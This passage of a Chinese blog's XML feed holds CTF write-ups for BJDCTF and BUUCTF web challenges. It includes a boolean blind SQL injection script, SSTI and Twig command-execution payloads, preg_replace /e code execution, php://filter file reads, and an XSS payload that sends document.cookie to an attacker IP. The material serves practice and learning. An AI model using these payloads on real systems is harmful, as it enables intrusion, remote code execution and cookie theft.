class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;<span class="comment">//get yds=flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>审计代码，$连用可以导致变量覆盖，代码中的<code>foreach()</code>用于给变量赋值，将传递的参数逐个赋值给相应的变量。如果get传递参数<code>?yds=flag</code>，第二个foreach循环会执行$yds=$flag，因为没有传递名为flag的参数，所以第三个foreach并不会exit，到第一个if语句的时候，因为没有传递flag参数，所以会exit($yds)，但是刚刚$yds已经被赋值$flag了，所以可以get flag</p><h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>robots.txt中提示有hint.txt，hint.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;出题人四级压线才过 见谅见谅 领会精神</span><br></pre></td></tr></table></figure><p>fuzz一下，可以看到ban了很多字符，应该是黑名单过滤，part of blaklist：</p><ul><li>单引号双引号</li><li>union，select，rand，and，=，like，mid</li></ul><p>但是没有ban括号，可以使用很多函数，没有ban反斜线，根据hint的查询语句，可以用反斜线转义掉单引号，而且没有ban井号注释符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=\</span><br><span class="line">password= or 1<span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27; or 1#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>可以看到回显变了，应该是登陆成功了，但是hint说只能用正确的密码才能getflag，页面只有正常和错误两种回显，考虑布尔盲注，y1ng大佬的wp说要用正则注入，不知道为啥，我用的ascii函数和&lt;&gt;进行的判断，直接注的密码，附上python脚本：（写的乱七八糟，凑合看吧。。。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">s+=s.lower()</span><br><span class="line">s+=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">ans=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    si=<span class="built_in">str</span>(i)</span><br><span class="line">    print(<span class="string">&#x27;trying &#x27;</span>+si)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27; or ascii(right(left(password,&#x27;</span>+si+<span class="string">&#x27;),1))&lt;&gt;&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(x))+<span class="string">&#x27;#&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(<span class="string">&#x27;http://337cb763-c5b3-4c33-86be-7978eaac7a70.node3.buuoj.cn/index.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You konw ,P3rh4ps needs a girl friend&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            ans+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(ans)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ans)==<span class="number">12</span>:<span class="comment">#用length()判断出password长度为12</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password:<span class="string">&#x27;OhyOuFOuNdit&#x27;</span>用这个密码登陆就有flag了</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>打开靶机之后，显示有flag页面，打开之后回显：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your ip is:xxxxxxx</span><br></pre></td></tr></table></figure><p>hint.php中有注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do you know why i know your ip?</span><br></pre></td></tr></table></figure><p>然后我在burp加了个XFF头，果然ip变了，Client-IP也可以，然后就没思路了，XFF头中写phpinfo()但是没办法执行，顶不住了，百度了下题解，原来是ssti注入，总之就是在header中添加<code>&#123;&#123;code&#125;&#125;</code>就可以了，<code>&#123;&#123;phpinfo()&#125;&#125;</code>就可以执行成功</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: &#123;&#123;system(&#39;ls &#x2F;&#39;)&#125;&#125;</span><br><span class="line">Client-IP: &#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>参考<br><a href='https://zhuanlan.zhihu.com/p/28823933' target='_blank' rel="noopener noreferrer">服务端模板注入攻击</a></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>和上一题的前端界面很像，但是是和cookie相关的，尝试ssti注入，登录后在cookie中有个user字段，将值改为<code>&#123;&#123;7*7&#125;&#125;</code>返回<code>hello 49</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125;</span><br><span class="line">jinja输出7777777</span><br><span class="line">twig输出49</span><br></pre></td></tr></table></figure><p>但是有过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;&#123;&#123;phpinfo()&#125;&#125;</span><br><span class="line">回显:</span><br><span class="line">What do you want to do?!</span><br></pre></td></tr></table></figure><p>题解上的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>其中cat /flag是执行命令的点，这个页面貌似只能显示一行结果，也就是说，如果执行ls /的话，其实回显只有一个var，看样子是只给显示命令执行结果的最后一行内容，可以用管道符连接head命令一起执行（tail也可以）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;|head -n 4</span><br><span class="line">回显中可以看到有一个flag文件，也就是说，ls命令的第四行结果是flag</span><br></pre></td></tr></table></figure><p>或者执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name flag</span><br><span class="line">回显：&#x2F;flag</span><br></pre></td></tr></table></figure><p>下图中的测试方法可用于判断使用的模板引擎<br><img src="http://ueverglow.top/wp-content/uploads/2020/03/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1200x500.jpg"></p><p>参考：<br><a href='https://zhuanlan.zhihu.com/p/28823933' target='_blank' rel="noopener noreferrer">服务端模板注入攻击</a><br><a href='https://www.freebuf.com/vuls/83999.html' target='_blank' rel="noopener noreferrer">服务端模板注入攻击 （SSTI）之浅析</a></p><h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h3><p>打开前端，啥都没有，已有一句gungungun，好暴躁。。<br>githack扫一下，可以扫到index</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>反序列化，在网上找了题解，因为是echo反序列化的结果，所以要利用php中一些有_toString()方法的类，在_toString()的原生类反序列化中，常用的是Error和Exception。</p><p>附上Y1ng大佬的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$y1ng</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;&quot;&lt;script&gt;window.open(\&#x27;[ip]:[port]/?\&#x27;+document.cookie);&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$y1ng</span>));</span><br></pre></td></tr></table></figure><p>buuoj上复现的题目不需要nc监听，直接在response的cookie中就可以getflag</p><h3 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h3><p>打开之后</p><p>“<br>Welcome to imagin’s Schrödinger Login Fucker!</p><p>It’s the most beautiful interface I can write（’▿’）</p><p>Intro:</p><p>You can give a wibsite to this page and this page will automatically identify various parameters of the target and try to burst the password.</p><p>The longer the compute time is, the higher the success rate of the burst is.</p><p>But before the final result is checked, no one knows whether to burst out the password. We call it the superposition state of burst and unburst</p><p>You can check the progress at any time, but once you check the progress, this website will stop bursting and delete the relevant progress, which we call the collapse of the superposition state.</p><p>If the CPU of the server is idle, it must be able to burst out the password you want very soon :)</p><p>Enjoy it!</p><p>imagin@1580308166<br>Note : Remenmber to remove test.php!</p><p>input a victim<br>Load of Server CPU90.58322228388658%<br>Already burst 79 sec, 130365 p/s<br>Forecast success rate 20.536404906595003%<br>“<br>其中note是纯白色的，一开始还没发现，在源代码中可以看到，尝试爆破<code>test.php</code>，输入参数<code>http://127.0.0.1/test.php</code></p><p>然后开始爆破之后点check，修改cookie中base64编码的时间戳，可以回显B站av号，评论区getflag</p><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>打开页面后是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用php伪协议<br>传递参数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line">post:</span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure><p>还可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I%20have%20a%20dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64- encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p>结果base64解码可以知道next.php的源代码是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是利用<code>preg_replace()</code>函数在<code>/e</code>模式下工作存在代码执行的漏洞，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);&#x2F;&#x2F;或者show_source()函数也行</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">?\S*&#x3D;$&#123;eval($_POST[xxx])&#125;</span><br><span class="line">post: xxx&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12328083.html">https://www.cnblogs.com/wangtanzhi/p/12328083.html</a><br><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><h3 id="部分wp"><a href="#部分wp" class="headerlink" title="部分wp:"></a>部分wp:</h3><p><a href="https://www.gem-love.com/ctf/2097.html">某大佬的wp</a><br><a href="https://imagin.vip/?p=166" title="另一个大佬的wp">另一个大佬的wp</a><br><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF" title="官方wp">官方wp</a><br><a href="https://github.com/BjdsecCA/BJDCTF2020_March" title="官方wp（github）">官方wp（github）</a></p><p>题目源码：<br><a href="https://github.com/BjdsecCA/BJDCTF2020_January">BJDCTF</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;干啥啥不行，签到第一名&lt;/p&gt;
&lt;h3 id=&quot;BJDCTF-2nd-签到-y1ng&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd-签到-y1ng&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF 2nd]签到-y1ng&quot;&gt;&lt;/a&gt;[BJDCTF 2nd]</summary>
      
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF web部分题解</title>
    <link href="https://r4in1.github.io/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>https://r4in1.github.io/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-12-02T12:26:04.000Z</published>
    <updated>2020-12-02T12:50:29.993Z</updated>
    
    <content type="html"><![CDATA[<p>搬运自原博客</p><p>接上一个关于buuoj上的题解，确实题很多，慢慢刷吧</p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>唉，大佬做题都是习惯在题目上标上Easy，本菜鸡已无力吐槽（自己菜还能怪谁。。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give me your flag, I will tell you if the flag is right.</span><br><span class="line">输入框</span><br></pre></td></tr></table></figure><p>只有一个输入框，输入查询的东西，只有三种回显，一个是数组，一个是Nonono，一个是返回空，猜测Nonono应该是检测到了敏感词，其他的不知道了，又是日常搜题解<br>参考题解之后，知道是堆叠注入，而且输入的内容并不是往常的sql注入一样是参数，而是列名，后端的查询语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>蒙了呀，，，这咋猜啊</p><p>根据大佬们的wp，这题有两种解法</p><h5 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p><code>sql_mode=PIPES_AS_CONCAT</code>是将<code>||</code>由<code>or</code>变为拼接字符串，在Oracle中是缺省支持的，但是在mysql中缺省不支持，这样的话,<code>select</code>只会查<code>||</code>之前的那一列，设置时候会将两列的结果合并，本地测试结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set sql_mode=pipes_as_concat;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 111||username from users limit 1;</span><br><span class="line">+<span class="comment">---------------+</span></span><br><span class="line">| 111||username |</span><br><span class="line">+<span class="comment">---------------+</span></span><br><span class="line">| 111Dumb       |</span><br><span class="line">+<span class="comment">---------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><h5 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h5><p>直接输入<code>*,1</code>，因为<code>*</code>是通配符，直接将所有的列查询出来，flag也就出来了</p><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>不会（菜的理直气壮）<br>大佬的wp：<br><a href='https://www.jianshu.com/p/f92311564ad0' target='_blank' rel="noopener noreferrer">HCTF2018-admin</a><br><a href='https://www.anquanke.com/post/id/164086#h3-13' target='_blank' rel="noopener noreferrer">一题三解之2018HCTF admin</a></p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>这题主要就是涉及抓包以及文件包含，打开链接之后是个黑色的页面，显示“把一切都放在那里了，去找吧”</p><p>说实话我是鼠标乱划拉，划拉到页面下方的中间位置看到浏览器左下角有链接的提示，实际上也可以通过右键查看源代码，发现有个链接，访问之后提示让点击SECRET按钮<br>点击之后却返回一个页面显示说“查阅结束，没看清么？回去再仔细看看吧。”</p><p>猜测应该是存在页面跳转，用Burp Suite抓包可以看到有个返回的html页面中的注释<code>secr3t.php</code><br>访问<code>secr3t.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后按提示访问<code>flag.php</code>，结果页面上没有显示，那么flag应该是保存在<code>falg.php</code>中的某个变量中，可以利用<code>secr3t.php</code>中的文件包含，利用php的filter协议读取<code>flag.php</code></p><p>构造payload：<br><code>?file=php://filter/convert.base64-encode/resource=flag.php</code><br>然后再将结果base64解码就有结果了<br>可参考：<br><a href='https://blog.csdn.net/nzjdsds/article/details/82461043' target='_blank' rel="noopener noreferrer">php伪协议的一些总结</a></p><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开靶机是个文件列表，只有三个文件，根据题目，Tornado是使用Python编写的Web服务器兼Web应用框架，那么这题很可能与ssti有关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt        <span class="comment">//flag in /fllllllllllllag</span></span><br><span class="line">/welcome.txt     <span class="comment">//render</span></span><br><span class="line">/hints.txt       <span class="comment">//md5(cookie_secret+md5(filename))</span></span><br></pre></td></tr></table></figure><p>注释后面是打开文件后的内容，观察打开文件后的<code>url</code>，<code>flag.txt</code>的<code>url</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e8c959bd-9e7f-4024-a8aa-02b012ae6b1b.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;9d2667d483e4cb5a237908e3e552d3a0</span><br></pre></td></tr></table></figure><p>看样子<code>filename</code>即是要打开的文件，然后根据<code>hints.txt</code>可以猜测，<code>filehash</code>即为文件签名，签名方式即为<code>hints.txt</code>中的方式，那么就还需要知道<code>cookie_secret</code><br>有关<code>render</code>函数的文章：<br><a href='https://blog.csdn.net/qq78827534/article/details/80792514' target='_blank' rel="noopener noreferrer">render函数介绍，以及 render: h =&gt; h(App)</a></p><p>然后根据其他大佬的思路，在burpsuite里是找不到<code>cookie</code>的，应该就是存在服务端了，然后根据报错页面（随便改一个文件的签名就会有404页面）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e8c959bd-9e7f-4024-a8aa-02b012ae6b1b.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure><p>其中<code>msg</code>参数存在模板注入，经过测试屏蔽了很多特殊字符，输入<code>&#123;&#123;1^1&#125;&#125;</code>或者<code>&#123;&#123;1^0&#125;&#125;</code>可以进行异或运算</p><p>然后就不会了（再次菜的理直气壮），翻了一（亿）下别人的wp：<br><a href='https://www.jianshu.com/p/4acb1dfc1b9f' target='_blank' rel="noopener 